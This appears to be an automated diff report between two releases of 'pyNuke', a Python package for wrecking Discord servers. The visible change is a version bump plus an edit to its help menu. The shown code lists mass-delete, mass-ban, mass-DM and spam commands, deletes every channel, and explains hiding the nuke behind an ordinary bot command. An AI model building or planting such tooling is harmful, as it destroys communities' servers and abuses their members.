# Comparing `tmp/pyNuke-1.2.2-py2.py3-none-any.whl.zip` & `tmp/pyNuke-1.2.3-py2.py3-none-any.whl.zip`

## zipinfo {}

```diff
@@ -1,10 +1,10 @@
-Zip file size: 6387 bytes, number of entries: 8
--rw-rw-rw-  2.0 fat      846 b- defN 23-Apr-07 17:30 pyNuke/__init__.py
--rw-rw-rw-  2.0 fat    14964 b- defN 23-Apr-07 17:16 pyNuke/discordNuke.py
+Zip file size: 6384 bytes, number of entries: 8
+-rw-rw-rw-  2.0 fat      846 b- defN 23-Apr-07 21:22 pyNuke/__init__.py
+-rw-rw-rw-  2.0 fat    14942 b- defN 23-Apr-07 21:17 pyNuke/discordNuke.py
 -rw-rw-rw-  2.0 fat     6274 b- defN 23-Apr-05 20:02 pyNuke/pyNuke.py
--rw-rw-rw-  2.0 fat      685 b- defN 23-Apr-07 17:30 pyNuke/setup.py
--rw-rw-rw-  2.0 fat      687 b- defN 23-Apr-07 17:30 pyNuke-1.2.2.dist-info/METADATA
--rw-rw-rw-  2.0 fat      110 b- defN 23-Apr-07 17:30 pyNuke-1.2.2.dist-info/WHEEL
--rw-rw-rw-  2.0 fat        7 b- defN 23-Apr-07 17:30 pyNuke-1.2.2.dist-info/top_level.txt
--rw-rw-r--  2.0 fat      590 b- defN 23-Apr-07 17:30 pyNuke-1.2.2.dist-info/RECORD
-8 files, 24163 bytes uncompressed, 5369 bytes compressed:  77.8%
+-rw-rw-rw-  2.0 fat      685 b- defN 23-Apr-07 21:22 pyNuke/setup.py
+-rw-rw-rw-  2.0 fat      687 b- defN 23-Apr-07 21:23 pyNuke-1.2.3.dist-info/METADATA
+-rw-rw-rw-  2.0 fat      110 b- defN 23-Apr-07 21:23 pyNuke-1.2.3.dist-info/WHEEL
+-rw-rw-rw-  2.0 fat        7 b- defN 23-Apr-07 21:23 pyNuke-1.2.3.dist-info/top_level.txt
+-rw-rw-r--  2.0 fat      590 b- defN 23-Apr-07 21:23 pyNuke-1.2.3.dist-info/RECORD
+8 files, 24141 bytes uncompressed, 5366 bytes compressed:  77.8%
```

## zipnote {}

```diff
@@ -6,20 +6,20 @@
 
 Filename: pyNuke/pyNuke.py
 Comment: 
 
 Filename: pyNuke/setup.py
 Comment: 
 
-Filename: pyNuke-1.2.2.dist-info/METADATA
+Filename: pyNuke-1.2.3.dist-info/METADATA
 Comment: 
 
-Filename: pyNuke-1.2.2.dist-info/WHEEL
+Filename: pyNuke-1.2.3.dist-info/WHEEL
 Comment: 
 
-Filename: pyNuke-1.2.2.dist-info/top_level.txt
+Filename: pyNuke-1.2.3.dist-info/top_level.txt
 Comment: 
 
-Filename: pyNuke-1.2.2.dist-info/RECORD
+Filename: pyNuke-1.2.3.dist-info/RECORD
 Comment: 
 
 Zip file comment:
```

## pyNuke/__init__.py

```diff
@@ -1,6 +1,6 @@
 __description__ = "A Discord Nuke. Meant to be used with good intent for testing purposes."
-__version__ = "1.2.2"
+__version__ = "1.2.3"
 __author__ = 'Tiago Coelho'
 __status__ = "Beta"
 __license__ = "The Unlicense  ||  Feel free to use this software however you want."
 __how__ = "First, import pyNuke using `import pyNuke` and import discordNuke using `from pyNuke import discordNuke`.                                                        Make a command using, for example, @bot.tree.command().                                                                                                           At the end of the command, add the following function call: await discordNuke.nukeactivate(interaction=interaction, bot=bot).                                     Now, everytime someone uses that command, you will be able to use the discord nuke on the console."
```

## pyNuke/discordNuke.py

```diff
@@ -32,15 +32,15 @@
                 break
             try:
                 todo = await self.get_input(input_message="INSERT COMMAND. USE '.help' FOR COMMAND LIST  ", timeout=200)
             except Exception as e:
                 print(e)
                 todo = 702103
             if todo == ".help":
-                print("""COMMAND LIST:\n.help\n.stop\n.allchannelsDELETE\n.allchannelsCHANGE_NAME_TO\n.spamMESSAGES\n.allrolesCHANGE_NAME_TO\n.allrolesDELETE\n.allmembersBAN\n.allmembersKICK\n.allmembersDM\n.allmembersCHANGE_NICKNAME_TO\n.guildCHANGE_NAME_TO\n.allemojisDELETE\n.allemojisCHANGE_NAME_TO\n.@everyone\n.guildCHANGE_ICON_TO\n.spamcreateCHANNELS\n.spamcreateCATEGORIES\n.vanityurlCHANGE_TO\n.vanityurlDELETE\n.allinvitesDELETE""")
+                print("""COMMAND LIST:\n.help\n.stop\n.allchannelsDELETE\n.allchannelsCHANGE_NAME_TO\n.spamMESSAGES\n.allrolesCHANGE_NAME_TO\n.allrolesDELETE\n.allmembersBAN\n.allmembersKICK\n.allmembersDM\n.allmembersCHANGE_NICKNAME_TO\n.guildCHANGE_NAME_TO\n.allemojisDELETE\n.allemojisCHANGE_NAME_TO\n.@everyone\n.spamcreateCHANNELS\n.spamcreateCATEGORIES\n.vanityurlCHANGE_TO\n.vanityurlDELETE\n.allinvitesDELETE""")
             elif todo == ".stop":
                 print("STOPPED NUKE ACTIVATION")
                 stop = True
             elif todo == ".allchannelsDELETE":
                 for channel in NUKE_guild.channels:
                     await channel.delete()
                 print("SUCCESSFULLY DELETED ALL CHANNELS")
```

## pyNuke/setup.py

```diff
@@ -1,12 +1,12 @@
 from setuptools import setup
 
 setup(
     name='pyNuke',
-    version='1.2.2',    
+    version='1.2.3',    
     description='A Discord Nuke. Meant to be used with good intent for testing purposes.',
     author='Tiago Coelho',
     author_email='melaochapanao@gmail.com',
     license='The Unlicense',
     packages=['pyNuke'],
     install_requires=['discord.py'],
```

## Comparing `pyNuke-1.2.2.dist-info/METADATA` & `pyNuke-1.2.3.dist-info/METADATA`

 * *Files 14% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: pyNuke
-Version: 1.2.2
+Version: 1.2.3
 Summary: A Discord Nuke. Meant to be used with good intent for testing purposes.
 Home-page: UNKNOWN
 Author: Tiago Coelho
 Author-email: melaochapanao@gmail.com
 License: The Unlicense
 Platform: UNKNOWN
 Classifier: Development Status :: 4 - Beta
```

## Comparing `pyNuke-1.2.2.dist-info/RECORD` & `pyNuke-1.2.3.dist-info/RECORD`

 * *Files 26% similar despite different names*

```diff
@@ -1,8 +1,8 @@
-pyNuke/__init__.py,sha256=vCQUgI-XMo78QjE3a43jjOC16RuWfoSEgkuoc9wTCvI,846
-pyNuke/discordNuke.py,sha256=VIRPtmB9l2KwKUAEiAiDAa8Iu1PjuAvSqrMJ-bH-v44,14964
+pyNuke/__init__.py,sha256=R5lycUw0h-MJi3BFF3XJwc1SD0bUsv8m4Mj60M_P6cQ,846
+pyNuke/discordNuke.py,sha256=Y_3fpaVPqLrsC7TykSITPH6Nhzl3f30mENcipFd4piw,14942
 pyNuke/pyNuke.py,sha256=DbY-xkdEWRnnjvk1CbEAStD3UyCG8o7PEyH2u0A74WE,6274
-pyNuke/setup.py,sha256=B5lbUDHPOsvSRlgxhLhdIfKnXo1DY1remA8Ac-OcsAk,685
-pyNuke-1.2.2.dist-info/METADATA,sha256=3Z6H-kBInQVjDf00xRY57D-JlYRKesR01akd7EODg_w,687
-pyNuke-1.2.2.dist-info/WHEEL,sha256=a-zpFRIJzOq5QfuhBzbhiA1eHTzNCJn8OdRvhdNX0Rk,110
-pyNuke-1.2.2.dist-info/top_level.txt,sha256=GYf2E3fkShqHJ7-3bg7t-zgJvd2TE0owLuLpHoIaDmA,7
-pyNuke-1.2.2.dist-info/RECORD,,
+pyNuke/setup.py,sha256=3ojAxjcve3y_qLLDYnRXK8l6mQjNPug427qf8swBfX4,685
+pyNuke-1.2.3.dist-info/METADATA,sha256=W2uEl7-ermsDpMq-7WDz05lyPUC5g6gZ0Fj4zMP1M8E,687
+pyNuke-1.2.3.dist-info/WHEEL,sha256=a-zpFRIJzOq5QfuhBzbhiA1eHTzNCJn8OdRvhdNX0Rk,110
+pyNuke-1.2.3.dist-info/top_level.txt,sha256=GYf2E3fkShqHJ7-3bg7t-zgJvd2TE0owLuLpHoIaDmA,7
+pyNuke-1.2.3.dist-info/RECORD,,
```

